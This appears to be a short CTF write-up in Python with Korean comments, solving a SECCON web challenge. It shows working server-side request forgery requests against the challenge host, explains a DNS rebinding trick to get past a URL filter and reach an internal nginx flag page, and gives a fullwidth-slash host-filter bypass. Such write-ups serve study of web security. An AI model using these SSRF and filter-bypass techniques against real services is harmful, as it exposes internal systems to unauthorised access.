# -*- coding: utf-8 -*-
import requests
# 라업보고 정리

############# 풀이 1 ################

# 웹서버의 IP 구하기
url = "http://ocu.chal.seccon.jp:10000/"
res = requests.get(url, params={
	'url':'http://ocu.chal.seccon.jp:10000/flag.php'
})
print(res.text) # 172.25.0.1

# 이후 브루트 포스 몇번 해보면 nginx ip도 알 수 있다.
# nginx : 172.25.0.3

# 코드에서 DNS를 두번 질의 한다.
# DNS Rebinding 공격(?) 비슷하게 네임서버에 아이피를 두개 등록한다.
# 하나는 172.25.0.3으로 등록한다.

# 그러면 첫 번째 질의에서는 내 서버의 아이피를 가져가게 되고, 필터링을 통과한다.
# 두 번째 질의에서는 nginx의 아이피로 응답받는다.

# 즉, a.com/flag.php(내 서버 도메인)으로 필터링을 위해 처음 질의할때는 정상 ip를 가져와서
# 필터링을 통과하고, 실제 접속을 위한 두 번째 질의에서는 nginx의 ip를 받아와서
# 사실상 nginx/flag.php로 접속하게 된다.

############# 풀이 2 ##################

url = "http://ocu.chal.seccon.jp:10000/"
res = requests.get(url, params={
	'url':'http://nginx／flag.php'
})
print(res.text)

# 실제로 nginx 호스트는 차단되어있다.
# nginx/flag.php로 요청하면 잘리지만 이를 우회할 수 있다.
# ／ <--- 슬래시(/)처럼 생긴 특별한 친구다.
# 이를 이용하면 host를 nginx로 판단하지 않고 그 뒤까지 판단하는듯 하다.
# 자세한건 직접 출력해보면서 알아봐야할것 같다.
# 사람들 참,, 대단하다..